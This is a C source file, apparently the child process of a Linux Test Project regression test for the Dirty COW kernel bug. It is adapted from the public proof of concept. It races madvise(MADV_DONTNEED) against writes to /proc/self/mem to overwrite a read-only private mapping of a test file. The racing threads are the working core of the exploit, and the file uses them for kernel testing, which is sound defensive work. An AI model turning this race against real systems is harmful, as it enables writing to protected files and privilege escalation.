// SPDX-License-Identifier: GPL-2.0-or-later
/*
 * Copyright (c) 2016 Cyril Hrubis <chrubis@suse.cz>
 *  Based on: https://github.com/dirtycow/dirtycow.github.io
 */

#include <sys/mman.h>
#include <fcntl.h>
#include <pthread.h>
#include <unistd.h>
#include <sys/stat.h>
#include <string.h>
#include <stdlib.h>
#include <stdint.h>
#include <pwd.h>

#include "tst_safe_pthread.h"
#define TST_NO_DEFAULT_MAIN
#include "tst_test.h"

#define FNAME "test"
#define STR   "this is not a test\n"

static char *str = "m00000000000000000";
static void *map;
static int mfd;

/*
 * You have to race madvise(MADV_DONTNEED) ::
 * https://access.redhat.com/security/vulnerabilities/2706661
 *
 * This is achieved by racing the madvise(MADV_DONTNEED) system call while
 * having the page of the executable mmapped in memory.
 */
static void *madvise_thread(void *arg)
{
	int c = 0;

	(void)arg;

	while (1)
		c += madvise(map, 100, MADV_DONTNEED);

	tst_res(TINFO, "madvise: %i", c);

	return NULL;
}

/*
 * You have to write to /proc/self/mem ::
 * https://bugzilla.redhat.com/show_bug.cgi?id=1384344#c16
 *
 * The in the wild exploit we are aware of doesn't work on Red Hat Enterprise
 * Linux 5 and 6 out of the box because on one side of the race it writes to
 * /proc/self/mem, but /proc/self/mem is not writable on Red Hat Enterprise
 * Linux 5 and 6.
 */
void *proc_self_mem_thread(void *arg)
{
	int c = 0;

	(void)arg;

	while (1) {
		lseek(mfd, (uintptr_t) map, SEEK_SET);
		c += write(mfd, str, strlen(str));
	}

	tst_res(TINFO, "write: %i", c);

	return NULL;
}

void sighandler(int sig)
{
	(void) sig;

	_exit(0);
}

/*
 * You have to use MAP_PRIVATE for copy-on-write mapping.
 * Create a private copy-on-write mapping. Updates to the
 * mapping are not visible to other processes mapping the same
 * file, and are not carried through to the underlying file. It
 * is unspecified whether changes made to the file after the
 * mmap() call are visible in the mapped region.
 */
int main(void)
{
	pthread_t pth1, pth2;
	int fd;
	struct stat st;

	tst_reinit();

	SAFE_SIGNAL(SIGUSR1, sighandler);
	TST_CHECKPOINT_WAKE(0);

	/* Open it read only and map */
	fd = SAFE_OPEN(FNAME, O_RDONLY);
	SAFE_FSTAT(fd, &st);

	map = SAFE_MMAP(NULL, st.st_size, PROT_READ, MAP_PRIVATE, fd, 0);
	mfd = SAFE_OPEN("/proc/self/mem", O_RDWR);

	/* Try to rewrite it */
	SAFE_PTHREAD_CREATE(&pth1, NULL, madvise_thread, NULL);
	SAFE_PTHREAD_CREATE(&pth2, NULL, proc_self_mem_thread, NULL);

	pause();

	return 0;
}
